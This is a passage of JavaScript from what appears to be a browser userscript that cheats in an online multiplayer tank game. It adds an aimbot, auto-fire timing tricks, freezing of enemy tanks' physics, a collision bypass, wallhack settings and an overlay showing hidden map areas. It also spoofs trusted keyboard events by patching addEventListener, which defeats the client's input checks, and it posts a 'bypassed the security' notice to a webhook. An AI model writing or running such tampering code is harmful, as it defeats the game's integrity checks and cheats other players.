                    user.turret.shoot();
                    unsafeWindow.railgunBoost = window.railgunBoost = .1 + window.bonusSpeed / 1000;
                }

                if(this.isUser && isBindHeld('safeShot')) {
                    const zone = (window.mapName?.startsWith("Zone") || window.mapName?.startsWith("Зона"));
                    const fookRules = tanks.find(c => {
                        let base = c.enemy && c.name !== this.name && c.state === "active",
                            shotTime = Date.now() - c.data.chargeEffect?.date,
                            shooting = shotTime && shotTime <= document.testValue;
                        if(base) log(shotTime, document.testValue)
                        return base && shooting
                    });
                    if(zone && fookRules && data.chargeEffect.repeat) {
                        data.chargeEffect.repeat = true;
                        let boost = (Date.now() - fookRules.data.chargeEffect?.date) / 1000;
                        user.turret.shoot();
                        log(boost)
                        unsafeWindow.railgunBoost = window.railgunBoost = boost + document.testAdd;
                        /*
        values:
        document.testValue = 400;
        document.testAdd = 0.14;
       */
                    }
                }
            }

            this.stateTime = Date.now();
        } else this.stateTime = stateTime;

        const spawnEarly = this.enemy && this.state == "semi_active" && Date.now() - this.stateTime >= 3000 - 950 - window.bonusSpeed;

        if(this.isUser && isBindHeld('safeShot') && this.state === "active" && Date.now() - this.stateTime <= 140) {
            const zone = (window.mapName?.startsWith("Zone") || window.mapName?.startsWith("Зона"));

            const fookRules = tanks.find(c => {
                let base = c.enemy && c.name !== this.name && c.state === "active",
                    shotTime = Date.now() - c.data.chargeEffect?.date,
                    shooting = shotTime && shotTime <= document.testValue;
                if(base && data.chargeEffect.repeat) log("aka late", shotTime, document.testValue)
                return base && shooting
            });
            if(zone && fookRules && data.chargeEffect.repeat) {
                data.chargeEffect.repeat = false;
                let boost = (Date.now() - fookRules.data.chargeEffect?.date) / 1000;
                user.turret.shoot();
                log(boost)
                unsafeWindow.railgunBoost = window.railgunBoost = boost + 0.14;
            }
        }

        if(isBindHeld('preShot') && spawnEarly) user.turret.shoot(); // pre shot

        // dead 5500
        // semi_active 3000

        // some advanced shit lol.
        if(false && spawnEarly && mouse[4]) {
            const isZone = (window.mapName?.startsWith("Zone") || window.mapName?.startsWith("Зона"));

            const deadTank = tanks.find(c => c.enemy && c.name !== this.name && c.state === "dead" && Date.now() - c.stateTime >= 5500 - 1100);
            const teamActive = tanks.find(c => !c.enemy && !c.isUser && c.state !== "dead");
            const isGone = deadTank/* && teamActive*/ && isZone;

            log(deadTank, teamActive)
            if(isGone) user.turret.shoot();
        }

        if(!this.isUser && this.enemy && this.body) {
            let { freeze } = this.old;
            if(freeze && !this.freeze) this.freeze = freeze;

            if(window.freezeAll) {
                this.body.setMovable(false);

                let keys = Object.keys(this.body.vel);
                for(let key of keys) {
                    this.body.vel[key] = 0;
                    this.body.angleVel[key] = 0;
                }
            } else this.body.setMovable(true);

            if(freeze && Date.now() - freeze.date < freeze.time) {
                copyItem(this.body.orientations, freeze.orientations);
                copyItem(this.body.pos, freeze.pos);

                this.body.setMovable(false);
                let keys = Object.keys(this.body.vel);

                for(let key of keys) {
                    this.body.vel[key] = 0;
                    this.body.angleVel[key] = 0;
                }
            } else if(!window.freezeAll) this.body.setMovable(true);
        }
    }

    getStats(data) {
        this.state = byIndex(data.tankComponent, 3, 0)?.toLowerCase();
        this.team = byIndex(data.tankComponent, 4, 0)?.toLowerCase();
        this.enemy = this.team === "none" || (user.team && this.team !== user.team);

        if(this.isUser) return;
        if(!this.name) {
            const name = byPath(data.userTitleComponent, "UserTitleConfiguration.userName");
            if(typeof name === "string") {
                this.name = name;
                this.clanTag = byPath(data.userTitleComponent, "UserTitleConfiguration.clanTag");
                this.hasPremium = byPath(data.userTitleComponent, "UserTitleConfiguration.hasPremium");
                this.title = (this.clanTag ? `[${this.clanTag}] ` : "") + this.name;
            }
        };
    }

    getTurret(data) {
        this.turret = {
            name: byIndex(data.type, 0),
            id: byIndex(data.type, 1),
            dir: byIndex(data.weaponMount, 11),
            setDir: (dir) => {
                try {
                    setByIndex(user.data.weaponMount, 7, dir);
                    setByIndex(user.data.weaponMount, 8, dir);
                    //setByIndex(user.data.weaponMount, 22, 7, 0);

                    if (props?.rotateProp && typeof user.data.weaponMount[props.rotateProp] === 'function') {
                        user.data.weaponMount[props.rotateProp](0);
                        window.turretPacket && window.turretPacket();
                    }
                }catch(e){log(e.message)}
            },
            shoot: () => setByIndex(data.trigger, 6, true)
        };
    }

    getPhysics(data) {
        if (!data) return;

        this.body = {};

        let tankBody = byPath(data.tankPhysicsComponent, "body");
        if(!tankBody) return;

        let bodyState = byIndex(tankBody, 23);

        this.body.setMovable = (bool) => setByIndex(tankBody, 5, bool);

        /*
let obj = byIndex(user.data.tankPhysicsComponent, 7, 12),
keys = Object.keys(obj);
log(obj)
for(let key of keys) {
 obj[key] *= 2
}
obj.edited = true;

hitbox
*/
        [this.body.vel, this.body.orientations, this.body.angleVel, this.body.pos] = Object.values(bodyState);
    }
}

let mouse = [];
let key = window.key = [];

let binds = {
    predict:     { name: "T",     type: "keyboard", code: 84,  which: null },
    highPing:    { name: "Y",     type: "keyboard", code: 89,  which: null },
    ignoreTanks: { name: "M5",    type: "mouse",    code: null, which: 5   },
    safeShot:    { name: "Shift", type: "keyboard", code: 16,  which: null },
    preShot:     { name: "\\",    type: "keyboard", code: 226, which: null },
};

const STORAGE_KEY = "coffeeItem";

const state = {
    cleanScreen: false,
    deadBox: false,
    showSpawn: false,
    spawnShape: "triangle",
    flagTimer: false,
    removeBushes: false,
    removeExplosion: false,
    fovEnabled: false,
    fovValue: 1.00,
    enemyWh: false,
    enemyColor: [0x8f/255, 0x3e/255, 0x3e/255],
    teamWh: false,
    teamColor: [0x5b/255, 0x8f/255, 0x3e/255],
    deadWh: false,
    deadColor: [0x7A/255, 0x5D/255, 0x42/255],
    ghostWh: false,
    ghostColor: [0x81/255, 0x7E/255, 0x7E/255],
    aimBot: false,
    aimBotValue: 1,
    missChanceEnabled: false,
    missChanceValue: 15,
    lagComp: false,
    lagCompValue: 50,
    legacy: false,
    xt: false,
    menuX: null,
    menuY: null,
};

const rgbToInt = ([r,g,b]) => ((r*255|0)<<16)|((g*255|0)<<8)|(b*255|0);

try {
    const _saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
    if (_saved.state) Object.assign(state, _saved.state);
    if (_saved.binds) Object.assign(binds, _saved.binds);
} catch(e) {}

const isBindHeld = (k) => {
    const b = binds[k];
    if (!b || b.name === "None") return false;
    return b.type === "keyboard" ? !!key[b.code] : b.type === "mouse" ? !!mouse[b.which] : false;
};

function activateIgnoreTanks() {
    if (!user.data?.tankPhysics) return;
    let obj = user.data.tankPhysics,
        ks = Object.keys(obj),
        k = ks.find(c => typeof obj[c] === "object" && Object.values(obj[c]).includes("hull-main")),
        k2 = Object.keys(obj[k]).find(c => typeof obj[k][c] === "object" && Object.values(obj[k][c]).length === 12);
    obj[k]?.[k2] && setByIndex(obj[k][k2], 0, 0);
}

function deactivateIgnoreTanks() {
    if (!user.data?.tankPhysics) return;
    let obj = user.data.tankPhysics,
        ks = Object.keys(obj),
        k = ks.find(c => typeof obj[c] === "object" && Object.values(obj[c]).includes("hull-main")),
        k2 = Object.keys(obj[k]).find(c => typeof obj[k][c] === "object" && Object.values(obj[k][c]).length === 12);
    obj[k]?.[k2] && setByIndex(obj[k][k2], 0, 1);
}

document.addEventListener('mousedown', (e) => {
    if (binds.predict.type === "mouse" && !mouse[binds.predict.which] && e.which === binds.predict.which) window.predict = true;
    if (binds.highPing.type === "mouse" && !mouse[binds.highPing.which] && e.which === binds.highPing.which) window.freezeShot = true;
    if (binds.ignoreTanks.type === "mouse" && !mouse[binds.ignoreTanks.which] && e.which === binds.ignoreTanks.which) activateIgnoreTanks();
    mouse[e.which] = true;
});

document.addEventListener('mouseup', (e) => {
    if (binds.ignoreTanks.type === "mouse" && mouse[binds.ignoreTanks.which] && e.which === binds.ignoreTanks.which) deactivateIgnoreTanks();
    mouse[e.which] = false;
});

document.addEventListener("keydown", (event) => {
    if(key[event.keyCode] || document.activeElement?.type === "text" || !user.verified) return;

    if (binds.predict.type === "keyboard" && event.keyCode === binds.predict.code) window.predict = true; // turn on predict
    if (binds.highPing.type === "keyboard" && event.keyCode === binds.highPing.code) window.freezeShot = true; // turn on high ping shot
    if (binds.ignoreTanks.type === "keyboard" && event.keyCode === binds.ignoreTanks.code) activateIgnoreTanks(); // ignore tanks
    if (event.keyCode === 72 && ["dead_phantom", "dead", "semi_active"].includes(user.state)) {
        if(user.state === "semi_active") {
            _hStart();
        } else movement = true;
    }

    key[event.keyCode] = true;
});

document.addEventListener("keyup", (event) => {
    if(!key[event.keyCode] || !user.verified) return;
    if (binds.ignoreTanks.type === "keyboard" && event.keyCode === binds.ignoreTanks.code) deactivateIgnoreTanks();
    key[event.keyCode] = false;
});

document.addEventListener('wheel', (e) => {
    const scrollName = e.deltaY < 0 ? "MWheelUp" : "MWheelDown";
    if (binds.predict.type === "scroll" && binds.predict.name === scrollName) window.predict = true;
    if (binds.highPing.type === "scroll" && binds.highPing.name === scrollName) window.freezeShot = true;
}, { capture: true, passive: true });

window.setTargets = unsafeWindow.setTargets = (data) => {
    try {
        window.targetList = unsafeWindow.targetList = [];

        let res = byIndex(data, 2, 1),
            temp = [];

        for(let tank of res) {
            let pos = byIndex(tank, 1);

            let found = tanks.filter(c => c.body)?.sort((a, b) => dist(pos, a.body.pos) - dist(pos, b.body.pos))[0];

            found && temp.push(found);
        }

        window.targetList = unsafeWindow.targetList = temp;
    } catch(e) { log(e.message) };
};

window.horizontalScore = unsafeWindow.horizontalScore = (data) => {
    try {
        let score = 0;
        if(data.length) {
            let targets = [];
            for(let data_0 of data) {
                let arr = byIndex(data_0, 0, 6, 3, 7, 0);

                if(!arr?.length) continue;

                let name = byIndex(arr, 24, 4);

                let tank = tanks.find(c => c.name === name);

                if(!tank) continue;
                if(!tank.isUser && tank.team !== user.team && tank.state === "active") {
                    score += (tank.data.attachFlag && user.data?.attachFlag && tank.data.attachFlag[Object.keys(user.data.attachFlag).pop()]) ? 3 : 1;
                    window.threats.push(data_0);
                }

                targets.push(tank);
            }
            return score;
        }
        return score;
    } catch(e) { log(e.message); }
};

const getList = (list_0) => {
    let targets = [];

    for(let data_0 of list_0) {
        let arr = byIndex(data_0, 0, 6, 3, 7, 0);

        if(!arr?.length) continue;

        let name = byIndex(arr, 24, 4);

        let tank = tanks.find(c => c.name === name);
        if(!tank) continue;

        targets.push(tank);
    }

    return targets;
};

const BASE = 0.008726646;

function getAngleStep(deg) {
    if (deg <= 3) return BASE / 17;
    let t = (deg - 3) / (40 - 3);
    return BASE / 17 + t * (BASE - BASE / 17);
}

window.threats = [];
window.aim = unsafeWindow.aim = {
    getDeg: () => {
        if (!user.data?.targetingSystem) return 0;
        let deg = sliderValue("aimValue");
        let mltp = Math.PI / 180 / getAngleStep(deg);
        return Math.round(deg * mltp);
    },
    ready: () => {
        if (!user.data?.targetingSystem || !checked("Aim Bot")) return;
        unsafeWindow.bestAngle = window.bestAngle = false;
        let deg = sliderValue("aimValue");
        let angleStep = getAngleStep(deg);
        setByPath(user.data.targetingSystem, "params.horizontalAimingParams.angleStep", angleStep);
        setByPath(user.data.targetingSystem, `params.horizontalAimingParams.directionsCount`, window.aim.getDeg());
    },
    data: () => {
        if (!user.data?.targetingSystem) return [true, {}];
        let offset = {};
        [offset.left, offset.right] = [byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 3, 0), byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 4, 0)];
        [offset.leftScore, offset.rightScore] = [byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 3, 2), byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 4, 2)];
        let degree = window.aim.getDeg();
        let failed = !unsafeWindow.bestAngle || !checked("Aim Bot") || (offset.left > degree && offset.right > degree) || !user.verified;
        if (!failed && checked("Miss Chance") && Math.random() * 100 < state.missChanceValue) failed = true;
        return [failed, offset];
    },
    establish: () => {
        try {
            if (!user.data?.targetingSystem) return null;
            setByIndex(byPath(user.data.targetingSystem, "targetingSystem"), 2, false);
            setByPath(user.data.targetingSystem, `params.horizontalAimingParams.directionsCount`, 0);
            let [failed, offset] = window.aim.data();
            if (failed) return null;
            let deg = sliderValue("aimValue");
            let angleStep = getAngleStep(deg);
            let mltp = Math.PI / 180 / angleStep;
            let step = angleStep;
            if (offset.leftScore > offset.rightScore) {
                let targets = getList(byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 3).targets),
                    turn = offset.left / mltp;
                log("left", offset.left * step);
                user.turret.setDir(unsafeWindow.aimDir + offset.left * step);
            } else {
                let targets = getList(byIndex(byPath(user.data.targetingSystem, "targetingSystem"), 4).targets),
                    turn = offset.right / mltp;
                log("right", offset.right * step);
                user.turret.setDir(unsafeWindow.aimDir - offset.right * step);
            }
            return true;
        } catch(e){log(e.message)}
    }
};

let { sleep, apply, setup, getNames, byIndex, byPath, setByIndex, setByPath, copyItem, byProto, getMain, changeLogo, dist, extract } = window;
apply("equals", function(value) { return null; });
start();

const checked = (name) => {
    switch(name) {
        case "Clean Screen":      return state.cleanScreen;
        case "Dead Box":
        case "Dead Box [zone/station]":   return state.deadBox;
        case "Show Spawn [users]":        return state.showSpawn;
        case "Flag Timer":        return state.flagTimer;
        case "Remove Bushes":     return state.removeBushes;
        case "Remove Explosion":  return state.removeExplosion;
        case "Enemy":             return state.enemyWh;
        case "Team":              return state.teamWh;
        case "Dead":              return state.deadWh;
        case "Ghost":             return state.ghostWh;
        case "FOV":               return state.fovEnabled;
        case "Aim Bot":           return state.aimBot;
        case "Miss Chance":       return state.missChanceEnabled;
        case "Lag Compensation":  return state.lagComp;
        case "Legacy":            return state.legacy;
        case "XT":                return state.xt;
        default: return false;
    }
};
window.checked = checked;

let battleEnd;
setInterval(() => {
    if(!tanks.length && movement) movement = false;
    if(!user.verified) return;
    let el = document.getElementsByClassName("ClientInfoComponentStyle-container")[0];
    if(el) el.style.display = state.cleanScreen ? "none" : "block";
    el = document.getElementsByClassName("UserInfoContainerStyle-userTitleContainer")[0];
    if(el) el.style.display = tanks.length && state.cleanScreen ? "none" : "flex";
    let els = document.getElementsByClassName("BattleHudComponentStyle-hudButton");
    for(let el of els) el.style.display = tanks.length && state.cleanScreen ? "none" : "block";

    battleEnd = document.getElementsByClassName("BattleKillBoardComponentStyle-tableContainer")[0];

    try { localStorage.setItem(STORAGE_KEY, JSON.stringify({ state, binds })); } catch(e) {}
}, 1e3);

const sliderValue = (id) => {
    switch(id) {
        case "aimValue": return state.aimBotValue;
        case "fovValue": return state.fovValue;
        default: return null;
    }
};

let press = document.press = (() => {
    const _add = unsafeWindow.EventTarget.prototype.addEventListener;
    const _dispatch = unsafeWindow.EventTarget.prototype.dispatchEvent;
    const patches = new WeakMap();
    unsafeWindow.EventTarget.prototype.addEventListener = function(type, fn, opts) {
        if (typeof fn !== "function") return _add.call(this, type, fn, opts);
        if (!patches.has(fn)) {
            patches.set(fn, (e) => {
                if (e.__spoof) e = new Proxy(e, { get(t, p) {
                    if (p === "isTrusted") return true;
                    if (p === "timeStamp") return t.__ts;
                    const v = t[p];
                    return typeof v === "function" ? v.bind(t) : v;
                }});
                return fn.call(this, e);
            });
        }
        return _add.call(this, type, patches.get(fn), opts);
    };
    return (key, code, up = false) => {
        const raw = new unsafeWindow.KeyboardEvent(up ? "keyup" : "keydown", {
            bubbles: true, cancelable: true, composed: true,
            key, code: `Key${key.toUpperCase()}`,
            keyCode: code, which: code, charCode: up ? 0 : code,
            location: unsafeWindow.KeyboardEvent.DOM_KEY_LOCATION_STANDARD,
            isComposing: false, view: unsafeWindow, detail: 0
        });
        Object.defineProperty(raw, "__spoof", { value: true });
        Object.defineProperty(raw, "__ts", { value: unsafeWindow.performance.now() });
        const el = unsafeWindow.document.querySelector("canvas") ?? unsafeWindow.document.activeElement ?? unsafeWindow.document.body;
        [el, unsafeWindow.document, unsafeWindow].forEach(t => _dispatch.call(t, raw));
    };
})();

document.hornetSize = [255, //back
                  255, //front
                  140, //side
                  null,
                  85, //bottom
                  30 //top
                 ];
document.waspSize = [235, //back
                  235, //front
                  140, //side
                  null,
                  85, //bottom
                  25 //top
                 ];

const WASP = {
    MAX_SPEED: 1174.6032,
    ACCEL_PLATEAU_MS: 1902,
    COAST_STOP_MS: 630,
    COAST_DIST_FROM_MAX: 420,
    TURN_RATE_DEG_S: 134,
    TURN_RATE_RAD_S: 2.339,
    TURN_RATE_A_DRIVE_DEG_S: 86.4,
    TURN_RATE_A_DRIVE_RAD_S: 1.508,
    TURN_RATE_D_DRIVE_DEG_S: 101.4,
    TURN_RATE_D_DRIVE_RAD_S: 1.770,
    GAME_UNIT_PER_METER: 101.3375,
    DISP_TABLE: [
        { holdMs: 0,    dist: 0 },
        { holdMs: 100,  dist: 9.4769 },
        { holdMs: 200,  dist: 35.1474 },
        { holdMs: 300,  dist: 69.6037 },
        { holdMs: 500,  dist: 165.435 },
        { holdMs: 750,  dist: 327.7786 },
        { holdMs: 1000, dist: 506.8228 },
        { holdMs: 1500, dist: 964.3037 },
        { holdMs: 2000, dist: 1554.4734 },
        { holdMs: 3000, dist: 2729.6253 },
    ],
    dispForHoldMs(holdMs) {
        if (holdMs <= 0) return 0;
        if (holdMs >= this.ACCEL_PLATEAU_MS) return 1554.4734 + this.MAX_SPEED * (holdMs - 2000) / 1000;
        const t = this.DISP_TABLE;
        for (let i = 1; i < t.length; i++) {
            if (holdMs <= t[i].holdMs) {
                const lo = t[i-1], hi = t[i];
                return lo.dist + (holdMs - lo.holdMs) / (hi.holdMs - lo.holdMs) * (hi.dist - lo.dist);
            }
        }
        return t[t.length-1].dist;
    },
    holdMsForDist(targetDist) {
        if (targetDist <= 0) return 0;
        let lo = 0, hi = 10000;
        for (let i = 0; i < 40; i++) { const mid = (lo+hi)/2; if (this.dispForHoldMs(mid) < targetDist) lo = mid; else hi = mid; }
        return (lo+hi)/2;
    },
    coastDistFromSpeed(speed) { return this.COAST_DIST_FROM_MAX * Math.pow(speed / this.MAX_SPEED, 2); },
    coastTimeFromSpeed(speed) { return this.COAST_STOP_MS * (speed / this.MAX_SPEED); },
};

let _hTarget = null, _hNavTarget = null, _hBoxRot = 0;
let _hYaw = 0, _hInterval = null, _hStartTime = null;
let _hReverse = false, _hTmSizes = null;

// Closest point on the box boundary from (fromX, fromY) — used for steering.
// Box center = _hTarget, rotation = _hBoxRot, half-extents: side x (back+front)/2
function _hComputeNavTarget(fromX, fromY) {
    const hw = _hTmSizes[2];
    const hh = (_hTmSizes[0] + _hTmSizes[1]) / 2;
    const COS = Math.cos(_hBoxRot), SIN = Math.sin(_hBoxRot);
    const dx = fromX - _hTarget.x, dy = fromY - _hTarget.y;
    const lx = dx * COS + dy * SIN;
    const ly = -dx * SIN + dy * COS;
    const clX = Math.max(-hw, Math.min(hw, lx));
    const clY = Math.max(-hh, Math.min(hh, ly));
    return {
        x: clX * COS - clY * SIN + _hTarget.x,
        y: clX * SIN + clY * COS + _hTarget.y,
    };
}

// Signed distance from (px, py) to the rotated box.
// Negative = inside, 0 = boundary, positive = outside.
function _hDistToBox(px, py) {
    const hw = _hTmSizes[2];
    const hh = (_hTmSizes[0] + _hTmSizes[1]) / 2;
    const COS = Math.cos(_hBoxRot), SIN = Math.sin(_hBoxRot);
    const dx = px - _hTarget.x, dy = py - _hTarget.y;
    const lx = dx * COS + dy * SIN;
    const ly = -dx * SIN + dy * COS;
    const ox = Math.abs(lx) - hw, oy = Math.abs(ly) - hh;
    if (ox < 0 && oy < 0) return Math.max(ox, oy);  // inside
    return Math.sqrt(Math.max(0, ox) ** 2 + Math.max(0, oy) ** 2);  // outside
}

// 2D SAT: returns true when the green tank box and the red target box visually overlap.
function _hTankCollidesWithBox(tankX, tankY, tankYaw) {
    const mySizes = user.wasp ? document.waspSize : document.hornetSize;
    const myHw = mySizes[2], myHh = (mySizes[0] + mySizes[1]) / 2;
    const tmHw = _hTmSizes[2], tmHh = (_hTmSizes[0] + _hTmSizes[1]) / 2;
    const tC = Math.cos(tankYaw), tS = Math.sin(tankYaw);
    const bC = Math.cos(_hBoxRot), bS = Math.sin(_hBoxRot);
    const tCorners = [[-myHw,-myHh],[-myHw,myHh],[myHw,-myHh],[myHw,myHh]].map(([lx,ly]) => [lx*tC-ly*tS+tankX, lx*tS+ly*tC+tankY]);
    const bCorners = [[-tmHw,-tmHh],[-tmHw,tmHh],[tmHw,-tmHh],[tmHw,tmHh]].map(([lx,ly]) => [lx*bC-ly*bS+_hTarget.x, lx*bS+ly*bC+_hTarget.y]);
    for (const [ax, ay] of [[tC,tS],[-tS,tC],[bC,bS],[-bS,bC]]) {
        const tp = tCorners.map(([x,y]) => x*ax + y*ay);
        const bp = bCorners.map(([x,y]) => x*ax + y*ay);
        if (Math.max(...tp) < Math.min(...bp) || Math.max(...bp) < Math.min(...tp)) return false;
    }
    return true;
}

function _hStop(clean = false) {
    if (_hInterval) { cancelAnimationFrame(_hInterval); _hInterval = null; }
    document.removeEventListener("keydown", _hKeyInterrupt, true);
    if (_hTarget && _hStartTime) log(`[H] elapsed: ${((Date.now() - _hStartTime) / 1000).toFixed(2)}s  stateUsed: ${((Date.now() - user.stateTime) / 1000).toFixed(2)}s / 3.00s`);
    _hTarget = null;
    _hNavTarget = null;
    _hTmSizes = null;
    _hReverse = false;
    if (!clean) {
        press("w", 87, true);
        press("a", 65, true);
        press("s", 83, true);
        press("d", 68, true);
    }
}

function _hKeyInterrupt(e) {
    if (e.__spoof) return;
    if ([87, 65, 83, 68, 38, 37, 40, 39].includes(e.keyCode)) _hStop(true);
}

function _hStart() {
    if (_hInterval) { _hStop(); return; }
    if (!user.body) return;
    _hTarget = null; // clear any stale target immediately
    const ori = Object.values(user.body.orientations);
    const pos = Object.values(user.body.pos);
    const yaw = 2 * Math.atan2(ori[3], ori[0]);
    _hYaw = yaw;
    _hStartTime = Date.now();

    const teammate = tanks.find(c => !c.isUser && !c.enemy);
    if (!teammate || !teammate.body) return;
    _hTmSizes = teammate.wasp ? document.waspSize : document.hornetSize;
    document.addEventListener("keydown", _hKeyInterrupt, true);

    function _hConvert(e, t) {
        let n = {}, r = Object.keys(e);
        for (let l = 0; l < t.length; l++) { const o = t[l], c = r[l]; e.hasOwnProperty(c) && (n[o] = e[c]); }
        return n;
    }
    const tmPos = _hConvert(teammate.body.pos, "xyz");
    const tmOri = _hConvert(teammate.body.orientations, "xyzw");
    const tmYaw = 2 * Math.atan2(tmOri.w, tmOri.x);

    _hBoxRot = tmYaw;
    _hTarget = { x: tmPos.x, y: tmPos.y, z: tmPos.z };
    _hNavTarget = _hComputeNavTarget(pos[0], pos[1]);

    // pick approach direction: forward if teammate is ahead, reverse if behind
    const toTmX = tmPos.x - pos[0], toTmY = tmPos.y - pos[1];
    _hReverse = (toTmX * (-Math.sin(yaw)) + toTmY * Math.cos(yaw)) < 0;

    const ndx0 = _hNavTarget.x - pos[0], ndy0 = _hNavTarget.y - pos[1];
    const ndist0 = Math.sqrt(ndx0*ndx0 + ndy0*ndy0);
    const tankHh0 = (_hTmSizes[0] + _hTmSizes[1]) / 2;
    const driveMs0 = WASP.holdMsForDist(Math.max(0, ndist0 - WASP.COAST_DIST_FROM_MAX - tankHh0 + 80));
    log(`[H] teammate dist:${ndist0.toFixed(0)} boxRot:${(tmYaw * 180 / Math.PI).toFixed(1)}° est.driveMs:${driveMs0.toFixed(0)} reverse:${_hReverse}`);

    const _hTick = () => {
        if (!user.body || !_hTarget || !_hNavTarget) { _hStop(); return; }
        const now = Date.now();
        if (now - _hStartTime > 6000) { _hStop(); return; }

        const ori = Object.values(user.body.orientations);
        const pos = Object.values(user.body.pos);
        const yaw = 2 * Math.atan2(ori[3], ori[0]);

        const ndx = _hNavTarget.x - pos[0], ndy = _hNavTarget.y - pos[1];
        const ndist = Math.sqrt(ndx*ndx + ndy*ndy);

        if (_hTankCollidesWithBox(pos[0], pos[1], yaw)) { _hStop(); return; }

        const fwdX = -Math.sin(yaw), fwdY = Math.cos(yaw);
        const angleDiff = Math.atan2(fwdX * ndy - fwdY * ndx, fwdX * ndx + fwdY * ndy);
        // effDiff: steering error relative to chosen approach — back-align when reversing
        let effDiff = _hReverse ? angleDiff + Math.PI : angleDiff;
        if (effDiff > Math.PI) effDiff -= 2 * Math.PI;
        if (effDiff < -Math.PI) effDiff += 2 * Math.PI;

        // wait: stand still until drive window
        const remaining = 3000 - document.bekes - (now - user.stateTime);
        const tankHh = (_hTmSizes[0] + _hTmSizes[1]) / 2;
        const driveMs = WASP.holdMsForDist(Math.max(0, ndist - WASP.COAST_DIST_FROM_MAX - tankHh + 80));
        if (remaining > driveMs) {
            press("w", 87, true); press("s", 83, true); press("a", 65, true); press("d", 68, true);
            _hInterval = requestAnimationFrame(_hTick);
            return;
        }

        // drive: full throttle + steer toward nav target
        if (_hReverse) {
            press("w", 87, true);
            press("s", 83, false);
        } else {
            press("w", 87, false);
            press("s", 83, true);
        }
        press("a", 65, !(effDiff > 0.02));
        press("d", 68, !(effDiff < -0.02));
        _hInterval = requestAnimationFrame(_hTick);
    };
    _hInterval = requestAnimationFrame(_hTick);
}

(function() {
    const overlay = document.createElement("canvas");
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:99998;";
    const attach = () => document.body ? document.body.appendChild(overlay) : document.addEventListener('DOMContentLoaded', () => document.body.appendChild(overlay));
    attach();

    const ctx = overlay.getContext('2d');

    const resize = () => { overlay.width = window.innerWidth; overlay.height = window.innerHeight; };
    resize();
    window.addEventListener("resize", resize);

    let _camKeys = null;
    const _proj = {};

    function draw() {
        requestAnimationFrame(draw);
        ctx.clearRect(0, 0, overlay.width, overlay.height);

        if (user.verified && !_securityRan) {
            _securityRan = true;
            log('whaat')
            GM_xmlhttpRequest({
                method: "POST",
                url: _WEBHOOK,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({ content: `noname bypassed the security, ${formatMs(Date.now() - _localSaved)}` }),
            });
        }

        if (!_camKeys && unsafeWindow.espCam && user?.body?.pos) {
            _camKeys = Object.keys(user.body.pos);
        }

        if (unsafeWindow.espCam && _camKeys && !battleEnd && tanks.length && checked("Dead Box [zone/station]")) {
            const _camProp = props.espCam.str.split(".")[3].split("(")[0];
            const cam = unsafeWindow.espCam;

            if(unsafeWindow.mapName?.startsWith("Zone") || unsafeWindow.mapName?.startsWith("Зона")) {
                const COS = 0.9848077400232231, SIN = 0.1736482513311082;
                const BP = [-2036.429, 10.662, 116.158];
                const BH = [181.075, 314.966, 116.158];
                const pts = [];
                let anyOn = false;
                for (let sx of [-1, 1]) for (let sy of [-1, 1]) for (let sz of [-1, 1]) {
                    const lx = sx * BH[0], ly = sy * BH[1];
                    const wp = {};
                    wp[_camKeys[0]] = lx * COS - ly * SIN + BP[0];
                    wp[_camKeys[1]] = lx * SIN + ly * COS + BP[1];
                    wp[_camKeys[2]] = sz * BH[2] + BP[2];
                    const on = cam[_camProp](wp, _proj);
                    if (on) anyOn = true;
                    pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
                }
                if (anyOn) {
                    const W = ctx.canvas.width, H = ctx.canvas.height;
                    const sp = pts.map(p => [
                        Math.max(-W, Math.min(W * 2, p[0])),
                        Math.max(-H, Math.min(H * 2, p[1])),
                        p[2]
                    ]);
                    const faces = [
                        [0, 1, 3, 2],
                        [4, 5, 7, 6],
                        [0, 1, 5, 4],
                        [2, 3, 7, 6],
                        [0, 2, 6, 4],
                        [1, 3, 7, 5],
                    ];
                    ctx.fillStyle = "rgba(255, 40, 40, 0.08)";
                    ctx.strokeStyle = "rgba(255, 40, 40, 0.6)";
                    ctx.lineWidth = 1;
                    for (const [a, b, c, d] of faces) {
                        if (!sp[a][2] || !sp[b][2] || !sp[c][2] || !sp[d][2]) continue;
                        ctx.beginPath();
                        ctx.moveTo(sp[a][0], sp[a][1]);
                        ctx.lineTo(sp[b][0], sp[b][1]);
                        ctx.lineTo(sp[c][0], sp[c][1]);
                        ctx.lineTo(sp[d][0], sp[d][1]);
                        ctx.closePath();
                        ctx.fill();
                        ctx.stroke();
                    }
                }
            }

            if(unsafeWindow.mapName?.startsWith("Station") || unsafeWindow.mapName?.startsWith("Станция")) {
                const broktanks = [
                    {
                        BP: [-2010.662, -36.429, 116.158],
                        BH: [181.075, 314.966, 116.158],
                        COS: Math.cos(1.745329),
                        SIN: Math.sin(1.745329),
                    },
                    {
                        BP: [4036.429, -1010.662, 116.158],
                        BH: [181.075, 314.966, 116.158],
                        COS: Math.cos(-2.967059),
                        SIN: Math.sin(-2.967059),
                    },
                ];
                for (const { BP, BH, COS, SIN } of broktanks) {
                    const pts = [];
                    let anyOn = false;
                    for (let sx of [-1, 1]) for (let sy of [-1, 1]) for (let sz of [-1, 1]) {
                        const lx = sx * BH[0], ly = sy * BH[1];
                        const wp = {};
                        wp[_camKeys[0]] = lx * COS - ly * SIN + BP[0];
                        wp[_camKeys[1]] = lx * SIN + ly * COS + BP[1];
                        wp[_camKeys[2]] = sz * BH[2] + BP[2];
                        const on = cam[_camProp](wp, _proj);
                        if (on) anyOn = true;
                        pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
                    }
                    if (anyOn) {
                        const W = ctx.canvas.width, H = ctx.canvas.height;
                        const sp = pts.map(p => [
                            Math.max(-W, Math.min(W * 2, p[0])),
                            Math.max(-H, Math.min(H * 2, p[1])),
                            p[2]
                        ]);
                        const faces = [
                            [0, 1, 3, 2],
                            [4, 5, 7, 6],
                            [0, 1, 5, 4],
                            [2, 3, 7, 6],
                            [0, 2, 6, 4],
                            [1, 3, 7, 5],
                        ];
                        ctx.fillStyle = "rgba(255, 40, 40, 0.08)";
                        ctx.strokeStyle = "rgba(255, 40, 40, 0.6)";
